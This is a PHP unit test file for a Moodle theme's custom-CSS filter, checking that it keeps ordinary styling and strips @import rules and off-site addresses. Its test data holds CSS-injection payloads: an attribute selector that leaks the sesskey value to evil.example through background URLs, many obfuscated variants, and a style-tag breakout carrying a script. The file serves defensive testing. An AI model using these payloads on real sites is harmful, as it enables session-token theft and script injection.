<?php
// This file is part of Moodle - https://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <https://www.gnu.org/licenses/>.

namespace theme_epure;

/**
 * Tests of the filter of the custom CSS of the entities and of the IOMAD companies.
 *
 * @package    theme_epure
 * @copyright  2026 Eric Falcon
 * @license    https://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 * @covers     \theme_epure\css_filter
 */
final class css_filter_test extends \basic_testcase {
    /** @var string Address of the site of the tests. */
    private const SITE = 'https://lms.example.org/moodle';

    /**
     * What stays: the CSS that changes how the page looks, the pictures of the site, relative and data: addresses.
     *
     * @dataProvider kept_provider
     * @param string $css CSS.
     */
    public function test_kept(string $css): void {
        $this->assertSame($css, css_filter::clean($css, self::SITE));
    }

    /**
     * The CSS that the filter keeps as it is.
     *
     * @return array
     */
    public static function kept_provider(): array {
        return [
            'colours' => ['.navbar { background: #123456 !important; color: var(--epure-ink); }'],
            'content with quotes' => ['.note::before { content: "\201C url(x) @import"; }'],
            'relative' => ['.hero { background-image: url(/pluginfile.php/1/theme/logo.png); }'],
            'relative quoted' => ['.hero { background-image: url("../pix/a.svg"); }'],
            'site' => ['.hero { background: url(\'https://lms.example.org/moodle/pluginfile.php/2/a.png\'); }'],
            'data' => ['.dot { background: url("data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\'/%3E"); }'],
            'font of the site' => ['@font-face { font-family: A; src: local("A"), url(/theme/font.woff2) format("woff2"); }'],
            'media' => ['@media (max-width: 600px) { .a { display: none; } }'],
            'image-set of the site' => ['.a { background: image-set("/a.png" 1x, url(/b.png) 2x); }'],
            'attribute selector' => ['a[href^="https://other.example"] { text-decoration: underline; }'],
        ];
    }

    /**
     * What goes: the @import rules and the addresses of other sites, however they are written.
     *
     * @dataProvider removed_provider
     * @param string $css CSS.
     * @param string $expected CSS after the filter.
     */
    public function test_removed(string $css, string $expected): void {
        $this->assertSame($expected, css_filter::clean($css, self::SITE));
    }

    /**
     * The CSS that the filter changes, and what it becomes.
     *
     * @return array
     */
    public static function removed_provider(): array {
        $leak = 'input[name="sesskey"][value^="a"] { background: %s; }';
        return [
            'import' => ['@import url(https://evil.example/x.css); .a { color: red; }', ' .a { color: red; }'],
            'import string' => ['@import "https://evil.example/x.css";.a{}', '.a{}'],
            'import escaped' => ['@\69mport "https://evil.example/x.css";.a{}', '.a{}'],
            'import upper case' => ['@IMPORT url(//evil.example/x.css);', ''],
            'url' => [sprintf($leak, 'url(https://evil.example/a)'), sprintf($leak, 'none')],
            'url quoted' => [sprintf($leak, 'url("https://evil.example/a")'), sprintf($leak, 'none')],
            'url without scheme' => [sprintf($leak, 'url(//evil.example/a)'), sprintf($leak, 'none')],
            'url other scheme' => [sprintf($leak, 'url(ftp://evil.example/a)'), sprintf($leak, 'none')],
            'url backslashes' => [sprintf($leak, 'url("\\\\\\\\evil.example/a")'), sprintf($leak, 'none')],
            'url escaped name' => [sprintf($leak, 'u\\72l(https://evil.example/a)'), sprintf($leak, 'none')],
            'url upper case' => [sprintf($leak, 'URL(https://evil.example/a)'), sprintf($leak, 'none')],
            'url escaped address' => [sprintf($leak, 'url("\\68ttps://evil.example/a")'), sprintf($leak, 'none')],
            'url with a tab' => [sprintf($leak, "url(\"ht\ttps://evil.example/a\")"), sprintf($leak, 'none')],
            'url hidden by a comment' => [sprintf($leak, 'url(/*x*/https://evil.example/a)'), sprintf($leak, 'none')],
            'site in the path' => [sprintf($leak, 'url(https://evil.example/lms.example.org/moodle/a)'),
                sprintf($leak, 'none')],
            'site as a prefix' => [sprintf($leak, 'url(https://lms.example.org.evil.example/a)'), sprintf($leak, 'none')],
            'site, other path' => [sprintf($leak, 'url(https://lms.example.org/moodlex/a)'), sprintf($leak, 'none')],
            'image-set string' => [sprintf($leak, 'image-set("https://evil.example/a" 1x)'), sprintf($leak, 'none')],
            'image-set url' => [sprintf($leak, '-webkit-image-set(url(//evil.example/a) 1x)'), sprintf($leak, 'none')],
            'image-set mixed' => [sprintf($leak, 'image-set("/a.png" 1x, "https://evil.example/b" 2x)'),
                sprintf($leak, 'none')],
            'cross-fade' => [sprintf($leak, 'cross-fade(url(/a.png), url(https://evil.example/b), 50%)'),
                sprintf($leak, 'none')],
            'src' => ['@font-face { src: src("https://evil.example/f.woff"); }', '@font-face { src: none; }'],
            'closing style tag' => ['.a { content: "</style><script>alert(1)</script>"; }',
                '.a { content: "<\/style><script>alert(1)</script>"; }'],
        ];
    }

    /**
     * The address of the site by default is that of Moodle.
     */
    public function test_site_by_default(): void {
        global $CFG;
        $css = '.a { background: url(' . $CFG->wwwroot . '/a.png); }';
        $this->assertSame($css, css_filter::clean($css));
        $this->assertSame('.a { background: none; }', css_filter::clean('.a { background: url(https://evil.example/a); }'));
    }

    /**
     * A text that is not UTF-8 is read all the same, without error, and still filtered.
     */
    public function test_not_utf8(): void {
        $css = ".a { content: \"\xff\"; background: url(https://evil.example/a); }";
        $this->assertStringNotContainsString('evil', css_filter::clean($css, self::SITE));
    }
}
